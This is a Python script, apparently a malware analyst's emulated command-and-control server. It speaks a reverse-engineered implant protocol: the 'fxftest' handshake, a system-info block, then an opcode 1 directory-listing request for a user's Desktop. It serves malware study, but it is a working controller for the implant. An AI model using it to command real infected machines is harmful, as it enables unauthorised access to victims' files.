#!/usr/bin/env python3
import socket, binascii, datetime, struct

HOST = ''            # 0.0.0.0
PORT = 443
RECV_SZ = 65535
TIMEOUT_S = 120
OPCODE = 1

# Ruta/máscara que enviaremos para el opcode 1 (NUL-terminada + padding a 256 bytes)
LIST_PATTERN = r"C:\Users\usuario\Desktop\*"

MAGIC_PARAM_REQ = b'v\x16od\x11og\x0fofv'   # cabecera que vemos antes de los 0x55

def hexdump(b: bytes) -> str:
    hx = binascii.hexlify(b).decode()
    return ' '.join(hx[i:i+2] for i in range(0, len(hx), 2))

def make_handshake_reply() -> bytes:
    return b"fxftest\x00"  # 8 bytes; compara sólo 7

def make_command_packet(opcode: int) -> bytes:
    # 0x104 bytes: [DWORD opcode LE] + relleno cero
    pkt = struct.pack("<I", opcode)
    return pkt + b"\x00" * (0x104 - len(pkt))

def make_param_block(path_mask: str) -> bytes:
    # 256 bytes: cadena ASCII NUL-terminada + padding con 0x00
    pb = path_mask.encode('ascii', errors='ignore') + b'\x00'
    if len(pb) > 256:
        pb = pb[:256]                    # se trunca si fuese demasiado larga
        if pb[-1] != 0:
            pb = pb[:-1] + b'\x00'
    return pb + b'\x00' * (256 - len(pb))

def looks_like_param_prompt(b: bytes) -> bool:
    # Suele ser exactamente 256 bytes, empieza por la magic y va seguido de muchos 0x55 ('U')
    if len(b) != 256:
        return False
    if b.startswith(MAGIC_PARAM_REQ):
        return True
    # Heurística alternativa: gran cantidad de 'U'
    return b.count(0x55) > 100

def handle_client(c: socket.socket, addr):
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f'\n[+] {ts} Connection from {addr[0]}:{addr[1]}')
    state = "WAIT_HELLO"   # -> WAIT_SYSINFO -> ACTIVE
    try:
        c.settimeout(TIMEOUT_S)
        while True:
            try:
                data = c.recv(RECV_SZ)
            except socket.timeout:
                print('    [*] idle timeout; keeping connection open...')
                continue

            if not data:
                print('    [*] Client closed connection.')
                break

            print(f'    [*] Received ({len(data)} bytes):')
            print(f'        ASCII: {data!r}')
            print(f'        HEX  : {hexdump(data)}')

            # 1) HELLO
            if state == "WAIT_HELLO" and b'fxftest' in data:
                resp = make_handshake_reply()
                c.sendall(resp)
                print(f'    [*] Sent handshake ({len(resp)} bytes)')
                state = "WAIT_SYSINFO"
                continue

            # 2) SYSINFO (512 bytes)
            if state == "WAIT_SYSINFO":
                if len(data) >= 512:
                    cmd = make_command_packet(OPCODE)
                    c.sendall(cmd)
                    print(f'    [*] Sent command ({len(cmd)} bytes), opcode={OPCODE}')
                    state = "ACTIVE"
                continue

            # 3) ACTIVE (opcode 1): el implante pide la ruta/máscara en un bloque de 256 bytes
            if state == "ACTIVE":
                if looks_like_param_prompt(data):
                    param = make_param_block(LIST_PATTERN)
                    c.sendall(param)
                    print(f'    [*] Sent opcode-1 param block (256 bytes) with path: {LIST_PATTERN!r}')
                    # Después de esto, el implante debería empezar a enviar los entries del directorio.
                    continue

                # Cualquier otro tráfico, solo lo mostramos
                continue

    except Exception as e:
        print(f'    [!] Error: {e}')
    finally:
        try:
            c.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        c.close()
        print('    [*] Connection closed.')

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f'[*] Listening on 0.0.0.0:{PORT}')
    try:
        while True:
            c, addr = s.accept()
            handle_client(c, addr)
    except KeyboardInterrupt:
        print('\n[!] Interrupted, shutting down.')
    finally:
        s.close()

if __name__ == "__main__":
    main()
